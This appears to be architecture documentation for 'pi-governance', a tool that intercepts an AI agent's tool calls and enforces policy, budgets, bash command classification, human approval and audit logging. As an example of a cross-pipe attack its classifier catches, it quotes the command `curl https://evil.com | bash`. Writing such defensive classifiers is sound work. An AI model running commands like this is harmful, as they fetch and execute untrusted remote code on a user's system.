# Architecture

How pi-governance intercepts tool calls and enforces policy.

## High-level flow

```mermaid
graph TD
    A[User Message] --> B[Pi Agent Runtime]
    B --> C[session_start]
    C --> C1[Load Config]
    C1 --> C2[Resolve Identity]
    C2 --> C3[Create Policy Engine]
    C3 --> C4[Init Bash Classifier]
    C4 --> C5[Init Budget Tracker]
    C5 --> C6[Start Config Watcher]
    C6 --> C7[Init Audit Logger]

    B --> D[tool_call]
    D --> D1{Dry-run?}
    D1 -- Yes --> D1a[Block + Log]
    D1 -- No --> D2{Budget OK?}
    D2 -- No --> D2a[Block + Log]
    D2 -- Yes --> D3{Policy: Tool allowed?}
    D3 -- Deny --> D3a[Block + Log]
    D3 -- Allow --> D4{Bash command?}
    D4 -- Yes --> D5{Classify}
    D5 -- dangerous --> D5a[Block + Log]
    D5 -- needs_review --> D6{Requires approval?}
    D5 -- safe --> D7
    D4 -- No --> D7{Path check}
    D6 -- Yes --> D8[HITL Prompt]
    D8 -- Approved --> D7
    D8 -- Denied --> D8a[Block + Log]
    D7 -- Deny --> D7a[Block + Log]
    D7 -- Allow --> D9{HITL for non-bash?}
    D9 -- Yes --> D10[HITL Prompt]
    D10 -- Approved --> D11[Allow + Log]
    D10 -- Denied --> D10a[Block + Log]
    D9 -- No --> D11

    B --> E[tool_result]
    E --> E1[Log Result]

    B --> F[session_shutdown]
    F --> F1[Stop Config Watcher]
    F1 --> F2[Log Session Summary]
    F2 --> F3[Flush Audit Sinks]
```

## Config resolution

```mermaid
graph LR
    A[loadConfig] --> B{$PI_RBAC_GOVERNANCE_CONFIG?}
    B -- exists --> C[Load file]
    B -- no --> D{.pi/governance.yaml?}
    D -- exists --> C
    D -- no --> E{~/.pi/agent/governance.yaml?}
    E -- exists --> C
    E -- no --> F[Use built-in defaults]
    C --> G[Resolve env vars]
    G --> H[Validate with Typebox]
    H -- valid --> I[Return config]
    H -- invalid --> J[Throw ConfigValidationError]
```

## Identity chain

```mermaid
graph LR
    A[IdentityChain.resolve] --> B[EnvIdentityProvider]
    B -- found --> C[Return identity]
    B -- null --> D[LocalIdentityProvider]
    D -- found --> C
    D -- null --> E[Fallback: analyst role]
    E --> C
```

The identity chain tries providers in order. The first provider to return a non-null result wins. If all providers return null, the chain falls back to the most restrictive role (`analyst`).

## Module layers

```
┌─────────────────────────────────────┐
│         extensions/index.ts         │  Pi integration layer
│   (event handlers, lifecycle mgmt)  │
├─────────────────────────────────────┤
│              lib/                   │  Pure library (zero Pi dep)
│  ┌──────────┬───────────┬────────┐  │
│  │ config/  │ identity/ │ policy/│  │
│  │ loader   │ chain     │ yaml   │  │
│  │ schema   │ env-prov  │ oso    │  │
│  │ watcher  │ local-prov│ factory│  │
│  ├──────────┼───────────┼────────┤  │
│  │  bash/   │  audit/   │  hitl/ │  │
│  │ classify │ logger    │ cli    │  │
│  │ patterns │ sinks     │ webhook│  │
│  ├──────────┼───────────┼────────┤  │
│  │ budget/  │  facts/   │  tmpl/ │  │
│  │ tracker  │ yaml-store│ select │  │
│  │          │ oso-store │ render │  │
│  └──────────┴───────────┴────────┘  │
└─────────────────────────────────────┘
```

The `lib/` layer has zero dependency on Pi. It can be used standalone for testing, CI/CD policy validation, or integration with other agent frameworks.

The `extensions/` layer is the Pi integration shim. It registers event handlers (`session_start`, `tool_call`, `tool_result`, `session_shutdown`) and wires together the library modules.

## Key design decisions

### Blocked takes precedence

Both `blocked_tools` and `blocked_paths` take precedence over their allowed counterparts. This makes it safe to use `allowed_tools: [all]` or `allowed_paths: ['**']` and selectively deny.

### Full-command danger check

The bash classifier checks dangerous patterns on the **full command** before splitting on pipe/semicolons. This catches cross-pipe attacks like `curl https://evil.com | bash` that would be missed if each segment were classified independently.

### Budget tracking per session

The `BudgetTracker` counts tool invocations per session, not per day. The `token_budget_daily` config value sets the session limit. This avoids the need for persistent state across sessions.

### Config hot-reload

The `ConfigWatcher` uses `fs.watch()` with a 500ms debounce. On valid config change, the policy engine and bash classifier are recreated in-place. Invalid configs are rejected silently (warning logged, current config kept).

### Optional Oso dependency

The Oso policy engine uses dynamic `import()` so the `oso` package is truly optional. It's not loaded unless `policy.engine: oso` is configured. This keeps the default install lightweight.
